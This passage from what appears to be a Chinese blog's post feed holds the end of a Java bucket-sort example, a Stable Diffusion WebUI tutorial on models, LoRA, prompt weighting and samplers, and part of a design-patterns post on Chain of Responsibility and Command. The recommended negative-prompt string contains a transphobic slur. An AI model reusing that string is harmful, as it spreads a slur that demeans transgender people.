class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将元素分配到桶中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : arr) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (num - min) / n;</span><br><span class="line">        buckets.get(index).add(num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每个桶中的元素进行排序</span></span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Integer&gt; bucket : buckets) &#123;</span><br><span class="line">        Collections.sort(bucket);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将各个桶中的元素按照顺序依次取出，组成有序序列</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (ArrayList&lt;Integer&gt; bucket : buckets) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : bucket) &#123;</span><br><span class="line">            arr[index++] = num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 排序 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Stable Diffusion】如何借助AI完成绘画？</title>
      <link href="/posts/731a4ede.html"/>
      <url>/posts/731a4ede.html</url>
      
        <content type="html"><![CDATA[<h2 id="AI绘画概述">AI绘画概述</h2><h3 id="绘图过程（Diffusion扩散）">绘图过程（Diffusion扩散）</h3><ol><li><p>条件输入</p><p>常用的文生图（txt2img）中首先要做的就是输入提示词了，这些输入的提示词会在SD WebUI内置的文本编码器（TextEncoder）中被编码为数字，使其可以被AI看懂，然后送入Text Transformer得到生图条件。</p></li><li><p>随机种子</p><p>开始生成前会随机获得一串数字，用于形成一幅随机的噪声图，作为AI绘图的“画板”。如下是一张256×256的RGB随机噪声图。</p><p><img src="https://oss.iuoyt.com/img/posts/20210520111319319.jpg" alt="随机噪声图"></p></li><li><p>图像生成（去噪）</p><p>在潜空间（Latent Space）中，AI会根据输入条件对噪声图进行去噪，即“采样”，经过多次的反复去噪，最后形成一张压缩过的“成品图”。</p><p><img src="https://oss.iuoyt.com/img/posts/92cd2b8f466bd891f92dd7ac4e8d33a57b1c42ca.png@1256w_170h_!web-article-pic.avif" alt="图像采样"></p></li><li><p>变分自编码器（VAE）</p><p>这一步是将潜空间中被压缩的“成品图”扩大成为我们可以看到的正常图片</p></li></ol><blockquote><p><img src="https://oss.iuoyt.com/img/posts/e541253f8201748cffeb3850ffeb2a4bbe866f7f.png@1256w_706h_!web-article-pic.avif" alt="img"></p><p>图源：<a href="https://www.bilibili.com/read/cv21564981">秋葉aaaki - Bilibili</a></p></blockquote><h3 id="Stable-Diffusion">Stable Diffusion</h3><p>目前市面上已经有了许多的用于AI绘画的平台，例如DALL·E、MidJourney、NovelAI，2022年8月，Stable Diffusion诞生了，无需极为强劲的性能就可以运行在日常使用的电脑上。并且由于其全面开源的特性，你可以在自己的电脑上直接完成部署，以及免费、不限量地生成AI绘画图片。</p><p>AUTOMATIC1111将开源的Stable Diffusion做成了一款可以在浏览器中直接操作的“应用”，即<a href="https://github.com/AUTOMATIC1111/stable-diffusion-webui">Stable Diffusion web UI</a>，借助它，可以将原本繁琐的代码层面的参数调校集成到一个Web页面中，通过WebUI，还可以使用到许多已发布的拓展插件。</p><h3 id="安装">安装</h3><p>B站的<a href="https://space.bilibili.com/12566101">秋葉aaaki</a>老师将Stable Diffusion WebUI以及其所需环境都合并为了整合包，无需安装git、python、cuda等任何内容，无需任何配置，解压就可以使用，安装方式详见视频：<a href="https://www.bilibili.com/video/BV1iM4y1y7oA">秋葉aaaki - Stable Diffusion整合包</a></p><p>安装完成WebUI本体，以及后续可能会用到的模型等，占用空间可能达到甚至150-200G，所以要注意存放位置哦。</p><h2 id="一些概念">一些概念</h2><h3 id="模型（Model）">模型（Model）</h3><p>模型是AI在绘画过程中的参考，是由大量的图像经由AI深度学习训练得出的成果。借助模型，可以让AI完成某一类效果的绘制实现，是AI绘图过程中极其重要的一个部分。文件大小一般在几个G不等，文件后缀为<code>.safetensors</code>、<code>.ckpt</code>。</p><p>国内外有许多优秀的模型站点，诸如<a href="https://huggingface.co/">Hugging Face</a>、<a href="https://civitai.com/">Civitai</a>，都是囊括了大量模型的宝库。</p><blockquote><p>一些常见实用模型：</p><ul><li><p>二次元风格</p><p>关键词：illustration, painting, sketch, drawing, painting, comic, anime, catoon</p><ul><li><a href="https://civitai.com/models/9409">Anything</a></li><li><a href="https://civitai.com/models/1274">Dreamlike Diffusion</a></li><li><a href="https://civitai.com/models/4468">Counterfeit</a></li><li><a href="https://civitai.com/models/4437">AbyssOrangeMix2</a></li></ul></li><li><p>2.5D风格</p><p>关键词：photography, photo, realistic, photorealistic, RAW photo</p><ul><li><a href="https://civitai.com/models/10415">国风3 GuoFeng3</a></li><li><a href="https://civitai.com/models/3816/protogen-x53-photorealism-official-release">Protogen</a></li><li><a href="https://civitai.com/models/10028">NeverEnding Dream (NED)</a></li></ul></li><li><p>真实系风格</p><p>关键词：3D, render, chibi, digital art, concept art, {realistic}</p><ul><li><a href="https://civitai.com/models/9052">LOFI</a></li><li><a href="https://civitai.com/models/5585/deliberate-for-invoke">Deliberate for Invoke</a></li><li><a href="https://civitai.com/models/4201">Realistic Vision</a></li></ul></li><li><p>其他</p><ul><li><a href="https://civitai.com/models/50696">QteaMix 通用Q版模型</a></li></ul></li></ul></blockquote><h3 id="词嵌入（Embeddings）">词嵌入（Embeddings）</h3><p>也写作Textual Inversion（文本倒置），作用是给AI解释部分字、词的含义。这些内容可能是难以理解的多词组合，或者是特定形象的呈现描述，可以理解为用已知的内容描述未知的内容，或者一个字典的书签，一个数据的指针。文件大小通常在20~100K，文件后缀为<code>.pt</code>、<code>.safetensors</code>。</p><p>比如解决AI不会画手的问题，可以使用这些Embeddings处理：</p><ul><li><a href="https://civitai.com/models/7808">EasyNegative</a>（二次元）</li><li><a href="https://civitai.com/models/55700">bad_prompt Negative</a>（二次元）</li><li><a href="https://civitai.com/models/4629">Deep Negative</a>（真人）</li></ul><h3 id="低秩适应模型（LoRA）">低秩适应模型（LoRA）</h3><p>LoRA（Low-Rank Adaptation Models），用于向AI传递、描述一个特征准确、主体清晰的形象，可以理解为一张彩页，上面详细记载了某个特定呈现的细节、特点。文件大小通常在200M以内，文件后缀为<code>.safetensors</code>。</p><p>触发LoRA的方法：<code>&lt;lora:LoRA名称&gt;</code>，设置权重在0.5-0.8可以保留确切特征但减弱对画面风格的影响。某些LoRA还提供了特定的提示词以强化调用的效果，可以一并写在提示词内。</p><h3 id="超网络（Hypernetwork）">超网络（Hypernetwork）</h3><p>与LoRa类似，HyperNetwork一般用于改善生成图像的整体风格（画风），大小在200M以内，文件后缀为<code>.pt</code>。Hypernetwork与LoRA很像，它们都很小且仅修改cross-attention模块，区别在于后者是通过改变权重修改，而Hypernetwork则是通过插入额外的网络改动cross-attention模块。</p><h2 id="书写提示词">书写提示词</h2><ul><li>提示词（Prompt），可以让AI知道你希望它完成什么内容。尽管称为AI绘画，但它其实无法理解你与它描述的自然语言是什么意思，因此，需要给AI提供的内容则需要通过它可以理解的方式。</li><li>在SD中，提示词分为两个部分：正向提示词与反向提示词，顾名思义，AI会按照正向提示词去完成创作，但会尽量避免反向提示词中出现的内容。</li><li>提示词需要使用英文书写，并且是以词组构成，因此并非像是与人描述一样使用长的复杂句。词组之间使用半角逗号分隔。</li></ul><h3 id="正向提示词">正向提示词</h3><blockquote><p>注：以下内容均整理自<a href="https://www.bilibili.com/video/BV12X4y1r7QB/?p=2">20分钟搞懂Prompt与参数设置，你的AI绘画“咒语”学明白了吗？</a></p></blockquote><h4 id="内容型提示词">内容型提示词</h4><ol><li><p>人物及主题特征</p><ul><li><p>服饰穿搭：white dress</p></li><li><p>发型发色：blonde hair, long hair</p></li><li><p>五官特点：small eyes, big mouth</p></li><li><p>面部表情：smiling</p></li><li><p>肢体动作：stretching arms</p></li></ul></li><li><p>场景特征</p><ul><li><p>室内/室外：indoor / outdoor</p></li><li><p>大场景：forest, city, street</p></li><li><p>小细节：tree, bush, white flower</p></li></ul></li><li><p>环境光照</p><ul><li><p>白天/黑夜：day / night</p></li><li><p>特定时段：morning, sunset</p></li><li><p>光环境：sunlight, bright, dark</p></li><li><p>天空：blue sky, starry sky</p></li></ul></li><li><p>画幅视角</p><ul><li><p>距离：close-up, distant</p></li><li><p>人物比例：fullbody, upper body</p></li><li><p>观察视角：from above,view of back</p></li><li><p>镜头类型：wide angle, Sony A7 III</p></li></ul></li><li><p>其他画面要素</p></li><li><p>通用内容：</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SFW</span>, (masterpiece:<span class="number">1</span>,<span class="number">2</span>), best quality, masterpiece, highres, original, extremely detailed wallpaper, perfect lighting,(extremely detailed CG:<span class="number">1</span>.<span class="number">2</span>),</span><br></pre></td></tr></table></figure></li></ol><h4 id="标准化提示词">标准化提示词</h4><ol><li><p>画质</p><ul><li><p>通用高画质：best quality, ultra-detailed, masterpiece, hires, 8k</p></li><li><p>特定高分辨率类型：extremely detailed CG unity 8k wallpaper（超精细的8KUnity游戏CG），unreal engine rendered（虚幻引擎渲染）</p></li></ul></li><li><p>画风提示词</p><ul><li><p>插画风：llustration, painting, paintrush</p></li><li><p>二次元：anime, comic, game CG</p></li><li><p>写实系：photorealistic, realistic, photograph</p></li></ul></li><li><p>其他特殊要求</p></li></ol><h3 id="反向提示词">反向提示词</h3><blockquote><p>通用内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSFW</span>, (worst quality:<span class="number">2</span>), (low quality:<span class="number">2</span>), (normal quality:<span class="number">2</span>), lowres, normal quality, ((monochrome)), ((grayscale)), skin spots, acnes, skin blemishes, age spot, (ugly:<span class="number">1</span>.<span class="number">331</span>), (duplicate:<span class="number">1</span>.<span class="number">331</span>), (morbid:<span class="number">1</span>.<span class="number">21</span>), (mutilated:<span class="number">1</span>.<span class="number">21</span>), (tranny:<span class="number">1</span>.<span class="number">331</span>), mutated hands, (poorly drawn hands:<span class="number">1</span>.<span class="number">5</span>), blurry, (bad anatomy:<span class="number">1</span>.<span class="number">21</span>), (bad proportions:<span class="number">1</span>.<span class="number">331</span>), extra limbs, (disfigured:<span class="number">1</span>.<span class="number">331</span>), (missing arms:<span class="number">1</span>.<span class="number">331</span>), (extra legs:<span class="number">1</span>.<span class="number">331</span>), (fused fingers:<span class="number">1</span>.<span class="number">61051</span>), (too many fingers:<span class="number">1</span>.<span class="number">61051</span>), (unclear eyes:<span class="number">1</span>.<span class="number">331</span>), lowers, bad hands, missing fingers, extra digit,bad hands, missing fingers, (((extra arms and legs))),</span><br></pre></td></tr></table></figure></blockquote><ol><li><strong>图像质量描述：</strong><ul><li>Worst quality: 最差质量</li><li>Low quality: 低质量</li><li>Normal quality: 正常质量</li><li>Lowres: 低分辨率</li><li>Blurry: 模糊</li><li>Unclear eyes: 眼睛不清晰</li></ul></li><li><strong>皮肤瑕疵：</strong><ul><li>Skin spots: 皮肤斑点</li><li>Acnes: 痘痘</li><li>Skin blemishes: 皮肤瑕疵</li><li>Age spot: 老年斑</li></ul></li><li><strong>审美负面描述：</strong><ul><li>Ugly: 丑陋</li><li>Morbid: 病态</li><li>Mutilated: 残缺</li><li>Tranny: 涉及性别问题（潜在冒犯性）</li></ul></li><li><strong>绘画技巧问题：</strong><ul><li>Duplicate: 重复</li><li>Poorly drawn hands: 手绘不好</li><li>Bad anatomy: 解剖结构不准确</li><li>Bad proportions: 比例不准确</li><li>Extra limbs: 多余肢体</li><li>Disfigured: 形象被扭曲</li><li>Missing arms: 缺失手臂</li><li>Extra legs: 多余腿</li><li>Fused fingers: 手指融合</li><li>Too many fingers: 手指过多</li><li>Missing fingers: 缺失手指</li><li>Extra digit: 额外数字或手指</li><li>Bad hands: 手部描绘不好</li><li>Extra arms and legs: 额外手臂和腿</li></ul></li></ol><h3 id="权重配置">权重配置</h3><h4 id="基础设置">基础设置</h4><ul><li>圆括号<code>(prompt)</code>：×1.1（可叠加，每层叠加都 ×1.1）</li><li>括号+数字<code>(prompt:1.5)</code>：指定权重倍数</li><li>大括号<code>&#123;prompt&#125;</code>：×1.05（可叠加，每层叠加都 ×1.05）</li><li>中括号<code>[prompt]</code>：×0.9（可叠加，每层叠加都 ×0.9）</li></ul><h4 id="进阶设置">进阶设置</h4><ul><li><p>混合<code> a|b</code>：混合两个描述同一对象的提示词要素</p><p>【例】<code>white|yellow flower</code>：生成黄色和白色混合的花</p></li><li><p>迁移<code>[|]</code>：连续生成具有多个不同特征的对象，不断迁移</p><p>【例】<code>[white|red|blue] flower</code>：先生成白花，再生成红花，再生成蓝花。</p></li><li><p>迭代<code>(::)</code>：与采样进程关联，一定阶段以后再生成特定对象。</p><p>【例】<code>(white flower:bush:0.8)</code>：进程到达80%（0.8）之前生成白花，80%之后再生成灌木。</p><p>【例】<code>(white flower::0.8)</code>：进程到达80%（0.8）之前生成白花，80%之后删除该提示词。</p></li></ul><h2 id="生图配置">生图配置</h2><h3 id="采样迭代步数（Steps）">采样迭代步数（Steps）</h3><p><img src="https://oss.iuoyt.com/img/posts/image-20240128162027645.png" alt="迭代步数"></p><p>如前面所说，AI在进行图像创作的过程中是经过了多次迭代的，这里设置的步数即是AI生图的迭代次数，一般设置在20-40，不同的模型、LoRA等一般有不同的推荐步数。通常迭代次数越多，产出的图像就会越清晰/细致，但生图时间也会更长。</p><h3 id="采样方法（Sampler）">采样方法（Sampler）</h3><p>采样方法就是AI生成图像时的特定算法，同样的种子和提示词在不同的采样方法下生出的图会也出现不同，通常模型、LoRA的作者会提供建议使用的采样方法，以达到可以实现的最好效果。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240128145326350.png" alt="采样方法"></p><ul><li>Euler系列（欧拉方法）：<ul><li>Euler：中规中矩、简单直接、不易出错</li><li>Euler a：Euler的前代，多样性较高</li><li>LMS：Euler的衍生版本，但容易出现色块</li></ul></li><li>Heun：Eular的改进算法，在每一步中预测两次噪声，速度比Eular慢一倍</li><li>DPM系列：<ul><li>DPM fast：细节少，质量较低</li><li>DPM adaptive：无视迭代步数，质量较高但时间较长</li><li>DPM2：DPM的2代算法，质量比1代高但速度很慢，可以使用1代增加迭代步数替代</li><li>后缀：<ul><li>a：前代算法，祖先采样器，每一步都会产生新的噪点，生成更多样</li><li>2S：单步算法</li><li>2M：二阶多步采样算法，相当于2S的进阶</li><li>3M：与2M类似，但需要更多的迭代步数，效果会更好一些</li><li>SDE：将OED（常微分方程）求解器更换为SDE（随机微分方程）的版本</li><li>Karras：Karras算法，噪点收敛速度不断降低（收敛步长缩短），可以在更高迭代数量下提高图像质量</li><li>Huen：Euler改进算法，质量更好，但速度慢</li><li>Exponential：画面更柔和，但细节更少</li></ul></li></ul></li><li>UniPC：2023年新推出的算法，10步以内即可生成高质量图像</li></ul><p>总结：</p><ol><li>简单快捷：Eular、Heun</li><li>性价比高（兼顾质量和速度）：DPM++ 2M Karras (20 -30步) 、UNIPC （15-25步）</li><li>质量较高：DPM++ SDE Karras</li><li>稳定复现：不选后缀a / SDE，反之则追求多样性</li></ol><h3 id="提示词相关性（CFG-Scale）">提示词相关性（CFG Scale）</h3><p><img src="https://oss.iuoyt.com/img/posts/image-20240128161245013.png" alt="提示词相关性"></p><p>引导AI按照提示词绘制的程度，推荐7~12，如果过高会出现变形。</p><h3 id="种子（Seed）">种子（Seed）</h3><p><img src="https://oss.iuoyt.com/img/posts/image-20240128161429602.png" alt="随机种子"></p><p>控制噪声图的产生，以控制画面内容一致性</p><h3 id="出图尺寸">出图尺寸</h3><p><img src="https://oss.iuoyt.com/img/posts/image-20240128160404946.png" alt="出图分辨率"></p><p>即生成图像的分辨率，默认为512×512，对设备（显存）要求较高。由于模型训练数据都比较小，因此将尺寸设置过高会出现多人的情况，最高在1000上下即可。这样生成的图像较为模糊，可以通过高清修复、后期处理、图生图等方式放大图像。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240128161005363.png" alt="高清修复"></p><p><img src="https://oss.iuoyt.com/img/posts/image-20240128161040438.png" alt="后期处理"></p><h3 id="生成批次">生成批次</h3><p><img src="https://oss.iuoyt.com/img/posts/image-20240128161630533.png" alt="生成批次"></p><p>AI绘画具有不确定性，可以让AI在一组提示词下一次性生成多张图片。（来一发十连抽）</p><blockquote><h2 id="参考资料">参考资料</h2><ol><li><a href="https://www.bilibili.com/read/cv21564981">【AI绘画】大魔导书：AI 是如何绘画的？Stable Diffusion 原理全解（一）</a></li><li><a href="https://lilianweng.github.io/posts/2021-07-11-diffusion-models/">What are Diffusion Models?</a></li><li><a href="https://space.bilibili.com/1814756990/channel/collectiondetail?sid=1285674">合集·B站第一套Stable Diffusion系统课程，来了！</a></li><li><a href="https://www.bilibili.com/read/cv26536525/">Stable Diffusion 30种采样方法全解析</a></li><li><a href="https://blog.csdn.net/lizhong2008/article/details/132278253">AI 绘画Stable Diffusion 研究（八）sd采样方法详解_sd采样方法有什么区别-CSDN博客</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> AI绘画 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stable Diffusion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式-行为型模式</title>
      <link href="/posts/3194e4c1.html"/>
      <url>/posts/3194e4c1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>设计模式系列文章导航</strong></p><ol><li><a href="/posts/bb7571ed.html">设计模式概述</a></li><li><a href="/posts/f9c29644.html">面向对象设计原则</a></li><li><a href="/posts/659b9bb9.html">设计模式 - 创建型模式</a></li><li><a href="/posts/b6c6dbc4.html">设计模式 - 结构型模式</a></li><li><a href="/posts/3194e4c1.html">设计模式 - 行为型模式</a> 📍当前位置</li></ol></blockquote><h2 id="职责链模式-Chain-of-Responsibility">职责链模式(Chain of Responsibility)</h2><div class="tip "><p><strong>定义</strong>：</p><p>避免将一个请求的发送者与接收者耦合在一起，让多个对象都有机会处理请求。将接收请求的对象连接成一条链，并且沿着这条链传递请求，直到有一个对象能够处理它为止。</p></div><h3 id="模式结构">模式结构</h3><h4 id="结构图">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231229155049439.png" alt="image-20231229155049439"></p><h4 id="实现代码">实现代码</h4><ul><li><p>抽象处理者（Handler）</p><p>它定义了一个处理请求的接口，一般设计为抽象类，由于不同的具体处理者处理请求的方式不同，因此在其中定义了抽象请求处理方法。每一个处理者的下家还是一个处理者，故在抽象处理者中定义了一个抽象处理者类型的对象（如结构图中的successor）作为其对下家的引用，通过该引用处理者可以连成一条链。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">    <span class="comment">//维持对下家的引用</span></span><br><span class="line">    <span class="keyword">protected</span> Handler successor;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSuccessor</span><span class="params">(Handler successor)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.successor=successor;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(String request)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体处理者（ConcreteHandler）</p><p>它是抽象处理者的子类，可以处理用户请求，在具体处理者类中实现了抽象处理者中定义的抽象请求处理方法，在处理请求之前需要进行判断，看是否有相应的处理权限，如果可以处理请求就处理它，否则将请求转发给后继者；在具体处理者中可以访问链中的下一个对象，以便请求的转发。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteHandler</span> <span class="keyword">extends</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(String request)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (请求满足条件) &#123;</span><br><span class="line">            <span class="comment">//处理请求</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//转发请求</span></span><br><span class="line">            <span class="built_in">this</span>.successor.handleRequest(request); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例">应用实例</h3><blockquote><p>某企业的SCM(供应链管理)系统中包含一个采购审批子系统。该企业的采购审批是分级进行的，即根据采购金额的不同由不同层次的主管人员来审批，主任可以审批5万元以下（不包括5万元）的采购单，副董事长可以审批5万元至10万元（不包括10万元）的采购单，董事长可以审批10万元至50万元（不包括50万元）的采购单，50万元及以上的采购单就需要开董事会讨论决定。如下图所示：</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231229155356119.png" alt="采购单分级审批示意图"></p><p>现使用职责链模式设计并实现该系统。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229155417392.png" alt="image-20231229155417392"></p><ul><li>抽象处理者（抽象传递者）：<code>PurchaseRequest</code></li><li>具体处理者（具体传递者）：<code>Director</code>、<code>VicePresident</code>、<code>President</code>、<code>Congress</code></li><li>请求类：<code>PurchaseRequest</code></li></ul><h3 id="特点及使用环境">特点及使用环境</h3><h4 id="优点">优点</h4><ol><li>使得一个对象无须知道是其他哪一个对象处理其请求，降低了系统的耦合度</li><li>可简化对象之间的相互连接</li><li>给对象职责的分配带来更多的灵活性</li><li>增加一个新的具体请求处理者时无须修改原有系统的代码，只需要在客户端重新建链即可</li></ol><h4 id="缺点">缺点</h4><ol><li>不能保证请求一定会被处理</li><li>对于比较长的职责链，系统性能将受到一定影响，在进行代码调试时不太方便</li><li>如果建链不当，可能会造成循环调用，将导致系统陷入死循环</li></ol><h4 id="适用环境">适用环境</h4><ol><li>有多个对象可以处理同一个请求，具体哪个对象处理该请求待运行时刻再确定</li><li>在不明确指定接收者的情况下，向多个对象中的一个提交一个请求</li><li>可动态指定一组对象处理请求</li></ol><h2 id="命令模式-Command">命令模式(Command)</h2><div class="tip "><p><strong>定义</strong>：</p><p>将一个请求封装为一个对象，从而让你可以用不同的请求对客户进行参数化，对请求排队或者记录请求日志，以及支持可撤销的操作。</p></div><p><img src="https://oss.iuoyt.com/img/posts/image-20231229155739538.png" alt="image-20231229155739538"></p><h3 id="模式结构-2">模式结构</h3><h4 id="结构图-2">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231229155808876.png" alt="image-20231229155808876"></p><h4 id="实现代码-2">实现代码</h4><ul><li><p>抽象命令类（Command）</p><p>抽象命令类一般是一个抽象类或接口，在其中声明了用于执行请求的<code>execute()</code>等方法，通过这些方法可以调用请求接收者的相关操作。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Command</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体命令类（ConcreteCommand）</p><p>具体命令类是抽象命令类的子类，实现了在抽象命令类中声明的方法，它对应具体的接收者对象，将接收者对象的动作绑定其中。具体命令类在实现<code>execute()</code>方法时将调用接收者对象的相关操作(Action)。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteCommand</span> <span class="keyword">extends</span> <span class="title class_">Command</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Receiver receiver; <span class="comment">//维持一个对请求接收者对象的引用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> &#123;</span><br><span class="line">        receiver.action(); <span class="comment">//调用请求接收者的业务处理方法action()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>调用者（Invoker）</p><p>调用者即请求发送者，它通过命令对象来执行请求。一个调用者并不需要在设计时确定其接收者，因此它只与抽象命令类之间存在关联关系。在程序运行时可以将一个具体命令对象注入其中，再调用具体命令对象的<code>execute()</code>方法，从而实现间接调用请求接收者的相关操作。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Invoker</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Command command;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造注入</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Invoker</span><span class="params">(Command command)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.command = command;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设值注入</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCommand</span><span class="params">(Command command)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.command = command;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//业务方法，用于调用命令类的execute()方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">        command.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接收者（Receiver）</p><p>接收者执行与请求相关的操作，具体实现对请求的业务处理。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Receiver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">action</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//具体操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-2">应用实例</h3><blockquote><p>为了用户使用方便，某系统提供了一系列功能键，用户可以自定义功能键的功能，例如功能键FunctionButton可以用于退出系统（由SystemExitClass类来实现），也可以用于显示帮助文档（由DisplayHelpClass类来实现）。</p><p>用户可以通过修改配置文件来改变功能键的用途，现使用命令模式来设计该系统，使得功能键类与功能类之间解耦，可为同一个功能键设置不同的功能。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229160222136.png" alt="image-20231229160222136"></p><ul><li>请求调用者：<code>FunctionButton</code></li><li>请求接收者：<code>SystemExitClass</code>、<code>DisplayHelpClass</code></li><li>抽象命令类：<code>Command</code></li><li>具体命令者：<code>ExitCommand</code>、<code>HelpCommand</code></li></ul><h3 id="模式变化">模式变化</h3><h4 id="实现命令队列">实现命令队列</h4><ul><li>实现动机：<ul><li>当一个请求发送者发送一个请求时，有不止一个请求接收者产生响应，这些请求接收者将逐个执行业务方法，完成对请求的处理</li><li>增加一个CommandQueue类，由该类负责存储多个命令对象，而不同的命令对象可以对应不同的请求接收者</li><li>批处理</li></ul></li></ul><h4 id="记录请求日志">记录请求日志</h4><ul><li><p>实现动机：</p><p>将请求的历史记录保存下来，通常以日志文件(Log File)的形式永久存储在计算机中</p><ul><li>为系统提供一种恢复机制</li><li>可以用于实现批处理</li><li>防止因为断电或者系统重启等原因造成请求丢失，而且可以避免重新发送全部请求时造成某些命令的重复执行</li></ul></li></ul><h4 id="实现撤销操作">实现撤销操作</h4><ul><li>可以通过对命令类进行修改使得系统支持撤销(Undo)操作和恢复(Redo)操作</li></ul><h4 